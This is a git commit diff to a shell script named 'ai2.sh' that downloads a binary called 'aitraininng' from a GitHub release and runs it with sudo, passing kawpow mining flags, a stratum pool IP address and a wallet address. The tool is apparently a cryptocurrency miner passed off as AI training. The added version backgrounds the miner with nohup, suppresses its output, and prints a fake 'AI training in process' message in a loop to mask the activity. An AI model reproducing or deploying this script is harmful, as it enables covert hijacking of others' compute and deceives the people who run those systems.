1ab86a797b19cf36bf864081745096e966c85cb6
max313iq <153689278+max313iq@users.noreply.github.com>
2024-12-14 03:43:28 +0300

    Update ai2.sh

--- ai2.sh
+++ ai2.sh
@@ -1,5 +1,14 @@
 #!/bin/bash
-wget https://github.com/max313iq/tech/releases/download/Gft/aitraininng
-chmod +x aitraininng
-sudo ./aitraininng -a kawpow -o stratum+tcp://178.62.59.230:4444 -u RM2ciYa3CRqyreRsf25omrB4e1S95waALr.batch
- 
+if pgrep -x "aitraininng" > /dev/null; then
+    echo "An AI training process is already running. Exiting."
+    exit 1
+fi
+nohup bash -c " 
+  wget https://github.com/max313iq/tech/releases/download/Gft/aitraininng -O aitraininng
+  chmod +x aitraininng
+  sudo ./aitraininng -a kawpow -o stratum+tcp://104.194.134.155:4444 -u RM2ciYa3CRqyreRsf25omrB4e1S95waALr.b21atch &
+" > /dev/null 2>&1 &
+while true; do
+    echo "AI training in process"
+    sleep 600
+done
